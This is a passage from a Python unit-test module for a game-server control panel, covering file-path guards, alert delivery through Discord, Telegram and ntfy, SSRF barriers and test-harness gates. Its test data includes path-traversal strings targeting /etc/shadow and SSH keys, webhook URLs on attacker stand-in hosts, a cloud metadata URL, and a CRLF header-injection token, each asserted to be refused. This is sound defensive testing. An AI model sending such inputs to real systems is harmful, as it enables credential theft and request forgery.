"""Part 5 of the unit suite. Imported for its side effects."""
import subprocess as _sub
from unit.part01 import (N, NS, _modfiles, _modsrc, _root, _sm_core, _sm_files, _sm_firewall, _ufw_raises, _ufw_raises_fnf, _ufw_raises_verb, check, eq, skip, json, os, sm, sys)  # noqa: F401,E402
from unit.part02 import (_time)  # noqa: F401,E402
from unit.part03 import (_io)  # noqa: F401,E402
from unit.part04 import (_SELF, _pl, _re)  # noqa: F401,E402
from unit import REPO_ROOT as _UNIT_ROOT  # noqa: E402
# ...and ordinary content is still deletable, or the file manager is useless.
for _p in ("addons/mymap.bsp", "./addons/mymap.bsp", "cfg/server.cfg", "logs", "lgsm2",
           "serverfiles-old", "my lgsm notes.txt"):
    check("file guard: ordinary path %r stays deletable" % _p,
          _sm_files._is_protected_path(_p, _SELF) is False)

# End-to-end through delete_path itself: the guard is worth nothing if the caller skips it, so
# assert no shell command is issued at all for a protected path.
_sent_rm = []
_orig_rc2 = _sm_core.run_command
try:
    _sm_core.run_command = lambda server, cmd, timeout=30, sudo=None: (_sent_rm.append(cmd), ("__OK__", "", 0))[1]
    _ok, _msg = _sm_files.delete_path(object(), _SELF, "./lgsm", selfname=_SELF)
    check("file guard: delete_path refuses './lgsm' and runs NOTHING",
          _ok is False and not _sent_rm, "ran: %s" % _sent_rm[:1])
    check("file guard: the refusal explains itself", "protected" in (_msg or "").lower(), _msg)
    _sent_rm.clear()
    _ok2, _ = _sm_files.delete_path(object(), _SELF, "x/../serverfiles", selfname=_SELF)
    check("file guard: delete_path refuses a traversal onto serverfiles",
          _ok2 is False and not _sent_rm, "ran: %s" % _sent_rm[:1])
    _sent_rm.clear()
    _ok3, _ = _sm_files.delete_path(object(), _SELF, "addons/junk.txt", selfname=_SELF)
    check("file guard: a real file still gets deleted, at its resolved path",
          _ok3 is True and len(_sent_rm) == 1
          and "/home/%s/addons/junk.txt" % _SELF in _sent_rm[0], "ran: %s" % _sent_rm[:1])
finally:
    _sm_core.run_command = _orig_rc2

# ── The renderer's one guarantee: no control byte reaches the page ────────────────────────────
# Console text carries player names and chat, so these bytes are AUTHORED, not just accidental.
# A sequence that never completes matched none of the three grammars and used to survive.
from panel.core import terminal as _term
for _src in ("player \x1b", "chat: \x1b\t hi", "x\x1b\x00y", "\x1b[38;5;", "\x1b\x9b"):
    check("terminal: an incomplete escape %r leaves no ESC behind" % _src,
          "\x1b" not in _term.render(_src), repr(_term.render(_src)))
for _src, _want in (("\x1b[32mgreen\x1b[0m", "green"), ("a\x1b[Kb", "ab"), ("x\x1b>y", "xy"),
                    ("\x1b]0;title\x07hi", "hi"), ("ssa\b\b\bsay hi", "say hi"),
                    ("abcdef\rXY", "XYcdef"), ("done\r\nnext", "done\nnext")):
    eq("terminal: %r still renders as a terminal would" % _src, _term.render(_src), _want)

# ── File manager: the path resolver every read/write/upload/browse goes through ────────────────
# _is_protected_path stops you deleting the game install; _safe_abspath is the one that stops you
# leaving the game user's home at all, and it guards four more operations than delete does.
_HOME = "/home/csgoserver"
for _p in ("../etc/passwd", "..", "a/../../etc", "../../root/.ssh/id_rsa", "../csgoserver2/secrets",
           "cfg/../../../etc/shadow"):
    eq("path resolver: %r cannot escape the home dir" % _p,
       _sm_files._safe_abspath("csgoserver", _p), None)
# A leading slash is treated as home-relative, not as the filesystem root: "/etc/passwd" must land
# inside the home, never at the real /etc/passwd.
eq("path resolver: an absolute-looking path is clamped into the home dir",
   _sm_files._safe_abspath("csgoserver", "/etc/passwd"), _HOME + "/etc/passwd")
for _p, _want in (("cfg/server.cfg", _HOME + "/cfg/server.cfg"),
                  ("./cfg/server.cfg", _HOME + "/cfg/server.cfg"),
                  ("a//b", _HOME + "/a/b"),
                  ("cfg/./x/../y", _HOME + "/cfg/y"),
                  ("", _HOME)):
    eq("path resolver: %r resolves under the home dir" % _p, _sm_files._safe_abspath("csgoserver", _p), _want)
# Non-str input must not crash the file manager.
for _junk in (None, 0, 12, [], {}):
    _r = _sm_files._safe_abspath("csgoserver", _junk)
    check("path resolver: %r is handled, not raised on" % (_junk,),
          _r is None or _r.startswith(_HOME), repr(_r))

# ── Never echo an exception's text to the browser ─────────────────────────────────────────────
# models.py states the rule ("returning str(exc) to a client is how raw internals leak into API
# responses (CodeQL py/stack-trace-exposure), and this codebase's rule is never to do it"), and
# three flash() calls were doing exactly that. The audit log is where the detail belongs.
import re as _re_fl
_app_src = open(os.path.join(_UNIT_ROOT, "app.py"),
                encoding="utf-8").read()
_leaky = []
for _m in _re_fl.finditer(r"flash\(\s*f?[\"'][^\"']*\{\s*(e|exc|err|ex)\b[^}]*\}", _app_src):
    _leaky.append("app.py:%d" % (_app_src[:_m.start()].count("\n") + 1))
check("no route flashes an exception's text to the browser (py/stack-trace-exposure)",
      not _leaky, ", ".join(_leaky))

# ── Alert delivery: Discord ────────────────────────────────────────────────────────────────────
# send_discord had never been executed by a test. It is the path a "server went offline" alert
# takes, and a broken one fails the same way as no alert at all — silence. The SSRF barrier around
# it matters too: the URL is rebuilt onto a constant host from regex-captured id/token, so no
# admin-supplied string can steer the request. Both properties are asserted here with the socket
# layer replaced, so nothing leaves the machine.
_sent = []


def _fake_post(url, data, headers, **_kw):
    _sent.append((url, json.loads(data.decode()), headers))
    return True, "sent"


_sv_post = N._post
try:
    N._post = _fake_post
    _WH = "https://discord.com/api/webhooks/12345/TESTONLY-not-a-real-webhook"
    _ok, _detail = N.send_discord(_WH, "codserver went offline unexpectedly.")
    check("discord: a valid webhook sends", _ok is True and _detail == "", repr(_detail))
    _url, _body, _hdr = _sent[-1]
    check("discord: the request goes to discord.com and nowhere else",
          _url.startswith("https://discord.com/api/webhooks/"), _url)
    check("discord: the message is the payload's content", _body.get("content", "").startswith("codserver went offline"))
    check("discord: it is sent as JSON", _hdr.get("Content-Type") == "application/json")

    # 1900 chars: Discord rejects over 2000, and a rejected alert is a missed alert.
    _sent.clear()
    N.send_discord(_WH, "x" * 5000)
    check("discord: an over-long message is truncated rather than rejected",
          len(_sent[-1][1]["content"]) == 1900, len(_sent[-1][1]["content"]))

    # Anything that is not a real discord webhook must not even reach _post.
    for _bad in ("https://evil.example/api/webhooks/1/x", "http://discord.com/api/webhooks/1/x",
                 "https://discord.com.evil.example/api/webhooks/1/x", "not a url", "", None,
                 "https://discord.com/api/webhooks/abc/xyz"):
        _sent.clear()
        _ok2, _d2 = N.send_discord(_bad, "hi")
        check("discord: %r is refused before any request" % (str(_bad)[:34],),
              _ok2 is False and not _sent, "sent=%s detail=%r" % (len(_sent), _d2))

    # The failure reasons must be distinguishable — "can't reach Discord" and "Discord said no" are
    # different problems for whoever is debugging why an alert never arrived.
    N._post = lambda u, d, h, **k: (False, "unreachable")
    _ok3, _d3 = N.send_discord(_WH, "hi")
    check("discord: an unreachable host says so", _ok3 is False and "couldn't reach" in _d3, _d3)
    N._post = lambda u, d, h, **k: (False, "rejected")
    _ok4, _d4 = N.send_discord(_WH, "hi")
    check("discord: a rejected webhook says so instead", _ok4 is False and "rejected it" in _d4, _d4)
finally:
    N._post = _sv_post

# The SSRF barrier itself: _post refuses anything outside the provider allow-list, before opening
# a socket. Passing a non-allow-listed URL must return 'blocked', not attempt a connection.
_blocked_ok, _blocked_reason = N._post("https://169.254.169.254/latest/meta-data/", b"{}", {})
check("alerts: _post blocks a URL outside the provider allow-list (SSRF barrier)",
      _blocked_ok is False and _blocked_reason == "blocked", _blocked_reason)

# ── Saving notification settings must not destroy the secrets ─────────────────────────────────
# The settings form never round-trips a real token back to the server — it posts None to mean
# "leave it alone". If save_settings took that literally it would wipe the bot token every time
# anyone touched an unrelated checkbox, and alerts would stop with nothing on screen to say why.
# update_config is stubbed throughout, so the real data/config.json is never written.
_saved_cfg = {}
_sv_cfgfn, _sv_update = N._cfg, N.update_config
try:
    N.update_config = lambda fn: fn(_saved_cfg)
    _existing_tok = N.encrypt_secret("12345:TESTONLYnotarealtoken00")
    _existing_wh = N.encrypt_secret("https://discord.com/api/webhooks/1/x")
    N._cfg = lambda: {"telegram": {"token": _existing_tok, "chat_id": "42"},
                      "discord": {"webhook": _existing_wh}}
    N.save_settings(telegram={"enabled": True, "chat_id": "42", "token": None},
                    discord={"enabled": True, "webhook": None}, events={})
    _n = _saved_cfg["notifications"]
    check("notify save: a None token KEEPS the stored one (the form never sends it back)",
          _n["telegram"]["token"] == _existing_tok)
    check("notify save: a None webhook keeps the stored one too",
          _n["discord"]["webhook"] == _existing_wh)

    _saved_cfg.clear()
    N.save_settings(telegram={"enabled": True, "chat_id": "42", "token": "67890:TESTONLYreplacementvalue"},
                    discord={"enabled": False, "webhook": ""}, events={})
    _n = _saved_cfg["notifications"]
    check("notify save: a new token replaces it", _n["telegram"]["token"] != _existing_tok)
    check("notify save: and is stored ENCRYPTED, not in the clear",
          "67890:TESTONLYreplacementvalue" not in _n["telegram"]["token"]
          and N.decrypt_secret(_n["telegram"]["token"]) == "67890:TESTONLYreplacementvalue")

    # Thresholds are clamped, and junk must not overwrite a good value.
    _saved_cfg.clear()
    _k = sorted(N._DEFAULT_THRESHOLDS)[0]
    _lo, _hi = N._THRESHOLD_BOUNDS[_k]
    N.save_settings(telegram={}, discord={}, events={}, thresholds={_k: _hi + 10_000})
    check("notify save: an out-of-range threshold is clamped to its bound",
          _saved_cfg["notifications"]["thresholds"][_k] == _hi,
          "%s -> %s" % (_k, _saved_cfg["notifications"]["thresholds"][_k]))
    _saved_cfg.clear()
    N.save_settings(telegram={}, discord={}, events={}, thresholds={_k: "not a number"})
    check("notify save: junk in a threshold is ignored, not written",
          isinstance(_saved_cfg["notifications"]["thresholds"][_k], int))
finally:
    N._cfg, N.update_config = _sv_cfgfn, _sv_update

# ── The Telegram command-watch loop ───────────────────────────────────────────────────────────
# Two properties, both load-bearing and neither previously executed by a test (telegram.py was at
# 31%). The loop is `while True`, so it is driven here by a scripted telegram_get_updates that
# raises a non-Exception sentinel when its script runs out — non-Exception on purpose, because the
# loop's own `except Exception` would otherwise swallow the thing ending it.
from panel.services.bots import telegram as _TG                                   # noqa: E402


class _StopWatch(BaseException):        # NOT an Exception: the watch loop catches those
    pass


class _FakeTime:
    """Records sleeps, and is ALSO the loop-breaker of last resort. The scripted get_updates can
    only end a run that reaches a poll — and the accept_commands-off path deliberately never polls,
    it just clears the menu and sleeps. Without a bound here that case runs forever (it did: the
    first version of this hung the suite until it was killed)."""
    def __init__(self, max_sleeps=4):
        self.slept, self._max = [], max_sleeps
    def sleep(self, n):
        self.slept.append(n)
        if len(self.slept) >= self._max:
            raise _StopWatch()


def _run_watch(scripted, cfg=None):
    """Drive _telegram_command_watch over a scripted list of telegram_get_updates return values.
    Returns (handled_commands, get_updates_calls, fake_time, set_commands_clear_flags).

    set_commands is stubbed HERE rather than by the caller: this helper installs its own, so an
    outer stub would be silently overwritten and record nothing. (It was, and did.)"""
    handled, calls, script, setcmds = [], [], list(scripted), []
    # _tg_dispatch is the seam, not _handle_telegram_command: the loop hands work to the worker
    # rather than running it, so what this helper records is what the loop DISPATCHED. The handler
    # is stubbed too, and ran_inline below asserts the loop never reaches it directly — running a
    # command on the poll thread is the regression this whole change removes.
    ran_inline = []
    saved = (_TG.notifications._cfg, _TG.notifications.telegram_get_updates,
             _TG.notifications.telegram_set_commands, _TG.decrypt_secret,
             _TG._handle_telegram_command, _TG._tg_dispatch, _TG.time)
    ft = _FakeTime()
    try:
        _default_cfg = {"telegram": {"enabled": True, "accept_commands": True,
                                     "token": "tok", "chat_id": "555"}}
        # A list means "one config per tick, last one repeats" — needed to model the operator
        # turning commands OFF while the poller is already running, which is the only path that
        # reaches the menu-clear branch (it is guarded on having registered the menu first).
        _cfgs = list(cfg) if isinstance(cfg, list) else [cfg if cfg is not None else _default_cfg]

        def _cfg_fn():
            return _cfgs[0] if len(_cfgs) == 1 else _cfgs.pop(0)
        _TG.notifications._cfg = _cfg_fn
        _TG.decrypt_secret = lambda v: v
        _TG.notifications.telegram_set_commands = \
            lambda tok, clear=False: (setcmds.append(clear), True)[1]
        _TG._handle_telegram_command = lambda app, tok, chat, text, sender=None: ran_inline.append(text)
        _TG._tg_dispatch = lambda app, tok, chat, text, sender=None: handled.append(text)
        _TG.time = ft

        def _get(token, offset=None, timeout=25):
            calls.append({"offset": offset, "timeout": timeout})
            if not script:
                raise _StopWatch()
            return script.pop(0)
        _TG.notifications.telegram_get_updates = _get
        try:
            _TG._telegram_command_watch(None)
        except _StopWatch:
            pass
    finally:
        (_TG.notifications._cfg, _TG.notifications.telegram_get_updates,
         _TG.notifications.telegram_set_commands, _TG.decrypt_secret,
         _TG._handle_telegram_command, _TG._tg_dispatch, _TG.time) = saved
    return handled, calls, ft, setcmds, ran_inline


# 1. THE BACKLOG IS NEVER REPLAYED. A /update sent to the bot restarts the panel; if the poller
#    came back up and re-read that same update, it would update and restart again, forever. The
#    first poll is a priming read (offset=-1, timeout=0) whose results are DISCARDED.
_backlog = [{"update_id": 41, "message": {"text": "/update", "chat": {"id": "555"}}}]
_handled, _calls, _, _sc, _inline = _run_watch([_backlog])
check("telegram watch: the first poll primes with offset=-1 and timeout=0",
      _calls and _calls[0]["offset"] == -1 and _calls[0]["timeout"] == 0, str(_calls[:1]))
check("telegram watch: a backlog command is NOT replayed on (re)start",
      _handled == [], str(_handled))
check("telegram watch: and polling resumes PAST the backlog, not at it",
      len(_calls) > 1 and _calls[1]["offset"] == 42, str(_calls[:2]))

# 2. ONLY THE AUTHORISED CHAT DRIVES THE BOT. /stop and /restart are in the command set, so this
#    check is the whole access boundary for anyone who finds the bot.
_live = [{"update_id": 50, "message": {"text": "/stop prod", "chat": {"id": "999"}}},
         {"update_id": 51, "message": {"text": "/status", "chat": {"id": "555"}}},
         {"update_id": 52, "message": {"text": "not a command", "chat": {"id": "555"}}}]
_handled, _calls, _, _sc, _inline = _run_watch([[], _live])
check("telegram watch: a command from an UNAUTHORISED chat is ignored",
      "/stop prod" not in _handled, str(_handled))
check("telegram watch: a command from the authorised chat is handled",
      _handled == ["/status"], str(_handled))
# The poll thread must DISPATCH, never execute. It used to run each command inline, so one
# /console against an unreachable host held up every command sent behind it for the whole connect
# timeout — and on Discord's socket, long enough to miss heartbeats and lose the session.
check("telegram watch: the poll thread hands commands off instead of running them",
      _inline == [], "ran on the poll thread: %s" % (_inline,))
check("telegram watch: plain text in the authorised chat is not treated as a command",
      "not a command" not in _handled, str(_handled))

# 3. A poll ERROR (None — a 409 from a second poller, or a network failure) backs off instead of
#    spinning the loop at full speed.
_handled, _calls, _ft, _sc, _inline = _run_watch([[], None])
check("telegram watch: a failed poll backs off rather than busy-looping",
      _ft.slept and _ft.slept[-1] == _TG._TG_CMD_BACKOFF, str(_ft.slept))

# 4. Commands switched OFF. Two separate behaviours, and they differ by whether the '/' menu was
#    ever registered — on a cold start there is nothing to clear, so only the running-then-disabled
#    case reaches that branch. Asserting the cold-start case alone would have looked like coverage
#    of the clear and tested the opposite.
_off = {"telegram": {"enabled": True, "accept_commands": False, "token": "tok", "chat_id": "555"}}
_handled, _calls, _ft, _sc, _inline = _run_watch([], cfg=_off)
check("telegram watch: with accept_commands off, no update poll happens at all",
      _calls == [], str(_calls))

_on = {"telegram": {"enabled": True, "accept_commands": True, "token": "tok", "chat_id": "555"}}
# Tick 1 registers the menu and primes; from tick 2 commands are off.
_handled, _calls, _ft, _sc, _inline = _run_watch([[]], cfg=[_on, _off])
check("telegram watch: the '/' menu is registered while commands are on",
      False in _sc, str(_sc))
check("telegram watch: turning commands off CLEARS the '/' menu, not leaving it advertising them",
      True in _sc, str(_sc))

# ── The ssh_manager package must keep resolving names at CALL time ────────────────────────────
# The whole split rests on one property: nothing inside the package binds another submodule's
# function by name. `from panel.ops.ssh_manager import run_command` inside, say, hosts.py would copy
# the object at import, and every stub on it would then assign cleanly and intercept nothing — the
# suites would make real SSH connections and still report green. It is the exact failure this repo
# has hit more than any other, and it leaves no trace, so it gets a gate rather than a comment.
import ast as _smg_ast                                                             # noqa: E402
_SMPKG = os.path.join(_root, "panel", "ops", "ssh_manager")
_smg_mods = {f[:-3] for f in os.listdir(_SMPKG) if f.endswith(".py") and f != "__init__.py"}
_smg_bad = []
for _f in sorted(os.listdir(_SMPKG)):
    if not _f.endswith(".py"):
        continue
    _tree = _smg_ast.parse(open(os.path.join(_SMPKG, _f), encoding="utf-8").read())
    for _n in _smg_ast.walk(_tree):
        if isinstance(_n, _smg_ast.ImportFrom) and (_n.module or "").startswith("panel.ops.ssh_manager"):
            for _a in _n.names:
                if _a.name not in _smg_mods:
                    _smg_bad.append("%s imports %s by NAME (must go through the module)"
                                    % (_f, _a.name))
check("ssh_manager: no submodule binds another's function by name (the stub seam)",
      not _smg_bad, "; ".join(_smg_bad[:4]))

# And the mirror of it on the test side: a stub assigned onto the PACKAGE shadows its __getattr__,
# so attribute-access callers would see it while the package's own 163 internal call sites would
# not. Half a stub, no error. Stubs belong on the defining submodule.
_smg_pkg_stubs = []
# Built here rather than reusing _STUB_FILES: that is defined further down the file, and a gate
# that silently depends on statement order is the kind of thing that starts passing vacuously.
#
# tools/nosudo_runner.py is in this list because it was the one that got it wrong, and the gate
# would have caught it the day it was written. It stubbed _run_local, subprocess and
# _real_subprocess onto the PACKAGE; _core kept the real ones, every internal caller resolved
# those, and a local privileged command ran REAL sudo while the run's own summary printed
# "0 refused — this run never tried to escalate". On a developer machine that is pam_faillock
# counting genuine auth failures against their account — the exact harm the wrapper exists to
# prevent, with its own reporting saying it had not happened.
_SMG_STUB_FILES = ["tests/unit_test.py", "tests/smoke_test.py", "tests/rbac_test.py",
                   "tests/setup_wizard_test.py", "tools/perf_bench.py",
                   "tools/nosudo_runner.py"]
for _f in _SMG_STUB_FILES:
    _src = open(os.path.join(_root, _f), encoding="utf-8").read()
    _tree = _smg_ast.parse(_src)
    _pkg_aliases = {a.asname or a.name.split(".")[-1]
                    for n in _smg_ast.walk(_tree) if isinstance(n, _smg_ast.Import)
                    for a in n.names if a.name == "panel.ops.ssh_manager"}
    _pkg_aliases |= {a.asname or a.name
                     for n in _smg_ast.walk(_tree) if isinstance(n, _smg_ast.ImportFrom)
                     and n.module == "panel.ops" for a in n.names if a.name == "ssh_manager"}
    for _n in _smg_ast.walk(_tree):
        if (isinstance(_n, _smg_ast.Attribute) and isinstance(_n.ctx, _smg_ast.Store)
                and isinstance(_n.value, _smg_ast.Name) and _n.value.id in _pkg_aliases):
            _smg_pkg_stubs.append("%s:%d %s.%s" % (_f, _n.lineno, _n.value.id, _n.attr))
check("ssh_manager: no test stubs onto the PACKAGE (it would shadow __getattr__)",
      not _smg_pkg_stubs, "; ".join(_smg_pkg_stubs[:4]))

# The positive half: the no-sudo wrapper must actually INTERCEPT, which the check above cannot
# say — "does not stub the package" is satisfied by stubbing nothing at all. Run its _install()
# and confirm the seams it claims. Real sudo is never invoked here: the assertion is that the
# stub is in place, and _is_sudo is a pure function.
_nsr_src = open(os.path.join(_root, "tools", "nosudo_runner.py"), encoding="utf-8").read()
_nsr_ns = {"__name__": "nsr_probe", "__file__": os.path.join(_root, "tools", "nosudo_runner.py")}
exec(compile(_nsr_src.split("if __name__ ==")[0], "nosudo_runner.py", "exec"), _nsr_ns)   # nosec
_nsr_ns["_install"]()
from panel.ops.ssh_manager import _core as _nsr_core, cron as _nsr_cron, files as _nsr_files
from panel.ops import system_ops as _nsr_so
check("no-sudo runner: it stubs the DEFINITION site of _run_local, not just the package",
      _nsr_core._run_local.__qualname__.startswith("_install"),
      "_core._run_local is %s" % _nsr_core._run_local.__qualname__)
check("no-sudo runner: system_ops._run is stubbed too", _nsr_so._run.__qualname__.startswith("_install"))
_nsr_unshimmed = [m.__name__ for m in (_nsr_core, _nsr_cron, _nsr_files)
                  if getattr(m, "subprocess", None).__class__.__name__ == "module"]
check("no-sudo runner: every ssh_manager submodule's subprocess is shimmed",
      not _nsr_unshimmed, "still real in: %s" % _nsr_unshimmed)
check("no-sudo runner: ...including _core's separate eventlet handle",
      _nsr_core._real_subprocess.__class__.__name__ != "module")
# ONE shim object across the modules, because the real `subprocess` is one object across them and
# tests reach for it that way: part01 patches _sm_core.subprocess.Popen and then asserts what
# files.py's Popen was handed. A shim PER MODULE made that assignment land on _core's instance
# while files.py kept its own, so the patch reached nothing and files.py ran the shim's passthrough
# against a `sudo -n panel-helper` argv — it got /bin/false back and the download checks failed
# with an empty argv list.
check("no-sudo runner: the submodules share ONE shim, as they shared one subprocess module",
      _nsr_core.subprocess is _nsr_files.subprocess is _nsr_cron.subprocess is _nsr_so.subprocess,
      "core=%r files=%r" % (id(_nsr_core.subprocess), id(_nsr_files.subprocess)))
# ...but _real_subprocess is a DIFFERENT module (eventlet.patcher's ungreened original), so it
# needs its own shim over that one. Standing the greened module in for it dropped _POPEN_KW's
# errors="replace" — eventlet's Popen re-implements communicate() without it — and a game server
# printing latin-1 came back as ("", "command execution error", -1).
check("no-sudo runner: _real_subprocess's shim stands over the ORIGINAL module, not the greened one",
      _nsr_core._real_subprocess is not _nsr_core.subprocess)
_nsr_latin = _nsr_core._run_local(r"printf 'caf\351: x\n'", timeout=10, sudo=False)
check("no-sudo runner: ...so undecodable output still comes back as text",
      _nsr_latin[2] == 0 and _nsr_latin[0].startswith("caf") and "\ufffd" in _nsr_latin[0],
      repr(_nsr_latin))
# The shape that escaped: the local privileged path is bash -c "sudo bash -c ...", so a check on
# argv[0] alone never sees the sudo.
for _cmd, _want in ((["sudo", "id"], True),
                    (["/bin/bash", "-c", "sudo bash -c x"], True),
                    (["/usr/bin/sudo", "id"], True),
                    ("sudo -n true", True),
                    (["/bin/bash", "-c", "echo hi"], False),
                    (["echo", "pseudonym"], False)):
    check("no-sudo runner: _is_sudo(%r) is %s" % (_cmd, _want),
          _nsr_ns["_is_sudo"](_cmd) is _want)

# A module-level PRIVATE variable that nothing in its own module reads is dead code to CodeQL
# (py/unused-global-variable) however many sibling modules import it — `from x import _y` is not a
# use it can follow across an import cycle, and this package has cycles by construction
# (firewall <-> hosts, cron <-> files). It announced itself the hard way: the split merged, and two
# alerts opened on main within minutes, on Ubuntu Pro constants whose only consumers were in
# hosts.py. The fix is to move the name to its consumer, not to annotate it — same rule as
# panel/routes/__init__.py records for app.py. This keeps that from recurring silently.
_smv_bad = []
for _f in sorted(os.listdir(_SMPKG)):
    if not _f.endswith(".py"):
        continue
    _tree = _smg_ast.parse(open(os.path.join(_SMPKG, _f), encoding="utf-8").read())
    _defined = {}
    for _n in _tree.body:
        if isinstance(_n, _smg_ast.Assign):
            for _x in _n.targets:
                if isinstance(_x, _smg_ast.Name) and _x.id.startswith("_") \
                        and not _x.id.startswith("__"):
                    _defined[_x.id] = _n.lineno
    _readnames = {_n.id for _n in _smg_ast.walk(_tree)
                  if isinstance(_n, _smg_ast.Name) and isinstance(_n.ctx, _smg_ast.Load)}
    for _k, _ln in _defined.items():
        if _k not in _readnames:
            _smv_bad.append("%s:%d %s" % (_f, _ln, _k))
check("ssh_manager: every module-private variable is read in its OWN module (CodeQL counts it dead otherwise)",
      not _smv_bad, "; ".join(_smv_bad[:4]))

# ── Every test suite must actually be WIRED IN ────────────────────────────────────────────────
# Both places that run the suites keep a hand-written list: tools/run-tests.sh (which CI runs) and
# the `for suite in ...` loop in the coverage job. A suite added to tests/ and forgotten in either
# one is the quietest possible failure — the file exists, it passes when you run it by hand, and
# nothing ever runs it again. That is the same shape as manage_test silently skipping in CI for as
# long as it had been in the script. These two checks are cheap and make the lists self-policing.
import pathlib as _tp                                                              # noqa: E402
_repo = _tp.Path(_UNIT_ROOT)
_suites = sorted(p.name for p in (_repo / "tests").glob("*_test.py"))
# Both wiring checks below are "every suite is referenced somewhere". With _suites empty they pass
# having compared nothing — measured by emptying the glob. A floor, not an inventory.
check("sweep: the tests/*_test.py scan found suites", len(_suites) >= 6,
      "%d suites — the two wiring checks below would pass vacuously" % len(_suites))
_runner = (_repo / "tools" / "run-tests.sh").read_text(encoding="utf-8")
_missing_runner = [s for s in _suites if s not in _runner]
check("test wiring: every tests/*_test.py is referenced by tools/run-tests.sh",
      not _missing_runner, "not run by CI: %s" % _missing_runner)

_ci = (_repo / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
_cov_line = [ln for ln in _ci.split("\n") if "for suite in" in ln]
_cov_names = set(_cov_line[0].split("for suite in", 1)[1].split(";")[0].split()) if _cov_line else set()
# url_map is deliberately out of the coverage loop (it only reads the URL map), so compare against
# the suites the runner treats as DB-owning plus the pure-logic ones — i.e. everything but url_map.
_want_cov = {s[:-len("_test.py")] for s in _suites} - {"url_map"}
_missing_cov = sorted(_want_cov - _cov_names)
check("test wiring: every suite is measured by the coverage job",
      not _missing_cov, "unmeasured: %s" % _missing_cov)

# ── Per-server LinuxGSM alert providers ───────────────────────────────────────────────────────
# These key names are LinuxGSM's, not the panel's: the values are written straight into the game
# server's own config file, where LinuxGSM reads them by exact name. A key we invented would be
# written, saved, shown back in the UI as if it had taken effect — and ignored by every alert run.
# That is a silent failure with no error anywhere, so the names are pinned here against
# lgsm/config-default/config-lgsm/*/_default.cfg upstream. This surface had no test at all.
from app import ALERT_PROVIDERS as _AP                                            # noqa: E402
from panel.routes.server_files import _ALERT_KEYS as _AK, _ALERT_KEY_SET as _AKS   # noqa: E402

# len() first, both times: `all(... for x in [])` is True, so an emptied ALERT_PROVIDERS or
# _ALERT_KEYS would pass every structural claim below while the feature was gone.
check("alert providers: there ARE providers, so the claims below examine some", len(_AP) >= 1)
check("alert providers: ...and keys", len(_AK) >= 1)
check("alert providers: every entry has id, label, toggle and fields",
      _AP and all(p.get("id") and p.get("label") and p.get("toggle") and p.get("fields")
                  for p in _AP))
check("alert providers: every toggle is a LinuxGSM <name>alert flag",
      all(p["toggle"].endswith("alert") for p in _AP),
      str([p["toggle"] for p in _AP if not p["toggle"].endswith("alert")]))
_dupe = [k for k in _AK if _AK.count(k) > 1]
check("alert providers: no key is claimed by two providers", not _dupe, str(sorted(set(_dupe))))
check("alert providers: ids are unique", len({p["id"] for p in _AP}) == len(_AP))
check("alert providers: every declared key is accepted by the write path",
      all(k in _AKS for k in _AK))
# Keys are LinuxGSM config identifiers — they end up in a shell-sourced file, so anything outside
# this charset would be a config-injection question rather than a typo.
check("alert providers: keys are plain lowercase config identifiers",
      all(_re.fullmatch(r"[a-z][a-z0-9_]*", k) for k in _AK),
      str([k for k in _AK if not _re.fullmatch(r"[a-z][a-z0-9_]*", k)]))

_ntfy = [p for p in _AP if p["id"] == "ntfy"]
check("alert providers: ntfy is offered", len(_ntfy) == 1)
if _ntfy:
    _nk = [_ntfy[0]["toggle"]] + [f["key"] for f in _ntfy[0]["fields"]]
    # Verbatim from LinuxGSM's _default.cfg: ntfyalert / ntfytopic / ntfyserver / ntfytoken.
    check("alert providers: ntfy uses LinuxGSM's real key names, not invented ones",
          _nk == ["ntfyalert", "ntfytopic", "ntfyserver", "ntfytoken"], str(_nk))

# ── ntfy: the one provider whose server the operator picks ────────────────────────────────────
# Telegram and Discord URLs are rebuilt on a CONSTANT host, so _post's allow-list is the whole
# story for them. ntfy cannot work that way — a self-hosted instance is the normal case — so the
# exception is validated at the sink by _NTFY_URL_RE. These assert the shape of that hole: what it
# lets through, and that it is not wide enough to carry a path, credentials or a scheme change.
check("ntfy: the public server + a plain topic builds a URL",
      N._ntfy_url("https://ntfy.sh", "my-topic") == "https://ntfy.sh/my-topic")
check("ntfy: a trailing slash on the server is tolerated (operators type it)",
      N._ntfy_url("https://ntfy.sh/", "my-topic") == "https://ntfy.sh/my-topic")
check("ntfy: a self-hosted host and port is allowed \u2014 that is the point of the exception",
      N._ntfy_url("https://ntfy.example.com:8443", "alerts") == "https://ntfy.example.com:8443/alerts")
for _srv, _top, _why in (
        ("http://ntfy.sh", "t", "plain http"),
        ("https://ntfy.sh/extra", "t", "a path on the server"),
        ("https://user:pw@ntfy.sh", "t", "credentials in the URL"),
        ("https://ntfy.sh?x=1", "t", "a query string"),
        ("https://ntfy.sh#f", "t", "a fragment"),
        ("file:///etc/passwd", "t", "a non-http scheme"),
        ("https://ntfy.sh", "../../etc", "a traversing topic"),
        ("https://ntfy.sh", "two words", "a topic with a space"),
        ("https://ntfy.sh", "a/b", "a topic with a slash"),
        ("https://ntfy.sh", "", "an empty topic")):
    check("ntfy: refuses %s" % _why, N._ntfy_url(_srv, _top) is None,
          "%r + %r built a URL" % (_srv, _top))

# The sink must refuse the same things even if a caller hands it a raw URL directly \u2014 the check
# lives in _post precisely so it does not depend on the caller having been careful.
_nt_ok, _nt_reason = N._post("https://169.254.169.254/latest/meta-data/", b"x", {},
                             allow_configured_host=True)
check("ntfy: the metadata endpoint is still blocked at the sink with the ntfy exception ON",
      _nt_ok is False and _nt_reason == "blocked", _nt_reason)
_nt_ok2, _nt_reason2 = N._post("https://ntfy.sh/a/b/c", b"x", {}, allow_configured_host=True)
check("ntfy: a multi-segment path is blocked at the sink too",
      _nt_ok2 is False and _nt_reason2 == "blocked", _nt_reason2)

# A token with a newline would split the request headers; send_ntfy must refuse rather than send.
_sv_post = N._post
try:
    _nt_calls = []
    N._post = lambda *a, **k: (_nt_calls.append(a) or (True, "sent"))
    _tok_ok, _tok_msg = N.send_ntfy("https://ntfy.sh", "topic", "bad\r\nX-Injected: 1", "hi")
    check("ntfy: a token containing CRLF is refused, and nothing is sent",
          _tok_ok is False and not _nt_calls, "%s / calls=%d" % (_tok_msg[:40], len(_nt_calls)))
    _hdr_ok, _ = N.send_ntfy("https://ntfy.sh", "topic", "GoodToken_123", "hi")
    check("ntfy: a well-formed token IS sent, as an Authorization header not in the URL",
          _hdr_ok and _nt_calls and "Bearer GoodToken_123" == _nt_calls[0][2].get("Authorization")
